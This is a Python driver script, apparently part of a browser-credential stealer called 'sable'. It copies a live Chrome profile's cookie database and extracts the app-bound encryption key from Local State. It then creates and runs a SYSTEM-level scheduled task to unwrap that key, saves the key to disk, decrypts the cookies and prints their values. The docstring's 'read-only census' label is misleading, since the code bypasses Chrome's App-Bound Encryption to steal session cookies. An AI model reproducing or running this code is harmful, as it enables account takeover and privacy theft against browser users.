"""Read-only census of one live Chromium profile, plus an ABE chain probe.

This file doubles as the SYSTEM helper entry point: the scheduled task launches it
with ``--abe-unwrap``, and the dispatch at the top hands off to ``abe.helper_main``
exactly the way ``entry.py`` does in the real build.
"""

from __future__ import annotations

import sys

sys.path.insert(0, r"C:\Users\Kuzenee\Desktop\55555\sable")

# Dispatch before anything else: the SYSTEM helper gets no profile and no census.
if "--abe-unwrap" in sys.argv:
    from agent import abe

    raise SystemExit(abe.helper_main(sys.argv[1:]))

import base64
import ctypes
import json
import os
import sqlite3
import subprocess
import tempfile
import traceback
from pathlib import Path

from agent import abe, log, util
from agent.sources.browsers import chromium

PROFILE = Path(sys.argv[1]) if len(sys.argv) > 1 else (
    Path(os.environ["LOCALAPPDATA"]) / "Google" / "Chrome" / "User Data" / "Default"
)
OUT = Path(sys.argv[2]) if len(sys.argv) > 2 else Path(tempfile.mkdtemp(prefix="sable-live-"))

report: dict[str, object] = {}


def elevated() -> bool:
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:  # noqa: BLE001
        return False


def census(profile: Path) -> dict[str, object]:
    source = profile / "Network" / "Cookies"
    if not source.is_file():
        source = profile / "Cookies"
    if not source.is_file():
        return {"cookies": "absent"}

    counts = {"v10": 0, "v11": 0, "v20": 0, "plain": 0, "empty": 0, "other": 0}
    with util.temp_workspace("sable-census-") as scratch:
        copy = scratch / "Cookies"
        if not util.copy_with_sidecars(source, copy):
            return {"cookies": "copy failed"}
        connection = sqlite3.connect(str(copy))
        try:
            rows = connection.execute("SELECT encrypted_value, value FROM cookies").fetchall()
        except sqlite3.Error as exc:
            return {"cookies": f"query failed: {exc}"}
        finally:
            connection.close()

    for encrypted, plain in rows:
        blob = bytes(encrypted) if isinstance(encrypted, (bytes, bytearray)) else b""
        if not blob:
            counts["empty" if not plain else "plain"] += 1
        elif blob[:3] == b"v10":
            counts["v10"] += 1
        elif blob[:3] == b"v11":
            counts["v11"] += 1
        elif blob[:3] == b"v20":
            counts["v20"] += 1
        else:
            counts["other"] += 1
    return counts


def app_bound_blob(profile: Path) -> bytes | None:
    state = util.read_json(profile / "Local State") or util.read_json(
        profile.parent / "Local State"
    )
    if not isinstance(state, dict):
        return None
    crypt = state.get("os_crypt") if isinstance(state.get("os_crypt"), dict) else {}
    text = crypt.get("app_bound_encrypted_key")
    if not isinstance(text, str):
        return None
    try:
        raw = base64.b64decode(text, validate=False)
    except Exception:  # noqa: BLE001
        return None
    return abe.strip_prefix(raw, b"APPB")


def probe_app_bound(profile: Path) -> dict[str, object]:
    """Walk the chain one stage at a time, reporting schtasks output verbatim."""
    blob = app_bound_blob(profile)
    if blob is None:
        return {"blob": "absent or no APPB prefix"}

    steps: dict[str, object] = {"blob_bytes": len(blob)}
    workspace = abe._workspace()
    source = workspace / abe._SOURCE_NAME
    result = workspace / abe._RESULT_NAME
    task = abe._task_name(workspace)
    command = abe._command_line(workspace)
    source.write_bytes(blob)
    steps["workspace"] = str(workspace)
    steps["task"] = task
    steps["command_len"] = len(command)
    steps["command"] = command

    for label, arguments in (
        ("create", [
            "/create", "/tn", task, "/tr", command,
            "/sc", "once", "/st", "00:00", "/ru", "SYSTEM", "/rl", "HIGHEST", "/f",
        ]),
        ("run", ["/run", "/tn", task]),
    ):
        completed = subprocess.run(
            ["schtasks", *arguments], capture_output=True, text=True, check=False
        )
        steps[f"schtasks_{label}_rc"] = completed.returncode
        detail = (completed.stdout + completed.stderr).strip()
        if detail:
            steps[f"schtasks_{label}"] = detail[:400]

    plaintext = abe._await_result(result)
    steps["result"] = "none" if plaintext is None else f"{len(plaintext)} bytes"
    if plaintext is not None:
        steps["result_head"] = plaintext[:20].hex()
        (OUT / "result.bin").parent.mkdir(parents=True, exist_ok=True)
        (OUT / "result.bin").write_bytes(plaintext)
        reduced = abe._reduce(plaintext)
        steps["reduced"] = "none" if reduced is None else f"{len(reduced)} bytes"
        if reduced is not None:
            (OUT / "key.bin").write_bytes(reduced)

    subprocess.run(["schtasks", "/delete", "/tn", task, "/f"], capture_output=True, check=False)
    import shutil
    shutil.rmtree(workspace, ignore_errors=True)
    return steps


def main() -> int:
    log.configure(debug=True)
    print(f"elevated: {elevated()}")
    print(f"profile : {PROFILE}")
    print(f"out     : {OUT}")

    if not PROFILE.is_dir():
        print("profile directory does not exist")
        return 2

    report["elevated"] = elevated()

    print("\n-- cookie census (from a copy)")
    census_result = census(PROFILE)
    report["census"] = census_result
    print(json.dumps(census_result, indent=2))

    print("\n-- app-bound chain, stage by stage")
    probe = probe_app_bound(PROFILE)
    report["app_bound"] = probe
    print(json.dumps(probe, indent=2))

    print("\n-- chromium.run_profile")
    OUT.mkdir(parents=True, exist_ok=True)
    try:
        written = chromium.run_profile(PROFILE, OUT)
        print(f"run_profile -> {written} items")
        report["written"] = written
    except Exception as exc:  # noqa: BLE001
        traceback.print_exc()
        report["written"] = f"raised {type(exc).__name__}: {exc}"

    print("\n-- artifacts")
    for path in sorted(OUT.rglob("*.json")):
        if path.name == "live-report.json":
            continue
        document = json.loads(path.read_text(encoding="utf-8"))
        count = len(document) if isinstance(document, list) else 1
        report.setdefault("artifacts", {})[path.name] = count
        print(f"{path.name:20} {count}")

    cookies_path = OUT / "cookies.json"
    if cookies_path.is_file():
        cookies = json.loads(cookies_path.read_text(encoding="utf-8"))
        decrypted = [item for item in cookies if item.get("value")]
        report["cookies_total"] = len(cookies)
        report["cookies_decrypted"] = len(decrypted)
        print(f"\ncookies decrypted: {len(decrypted)}/{len(cookies)}")
        for item in cookies[:5]:
            print(f"  {item['host']} {item['name']} = {item['value'][:24]!r}")

    (OUT / "live-report.json").write_text(
        json.dumps(report, indent=2, default=str), encoding="utf-8"
    )
    print(f"\nreport: {OUT / 'live-report.json'}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
